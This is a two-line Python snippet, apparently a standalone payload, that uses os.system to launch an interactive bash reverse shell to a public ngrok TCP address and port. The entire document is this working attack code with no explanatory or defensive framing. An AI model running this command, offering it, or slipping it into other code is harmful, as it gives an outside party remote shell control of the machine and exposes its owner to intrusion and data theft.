import os
print(os.system("bash -i >& /dev/tcp/0.tcp.ngrok.io/13810 0>&1"))
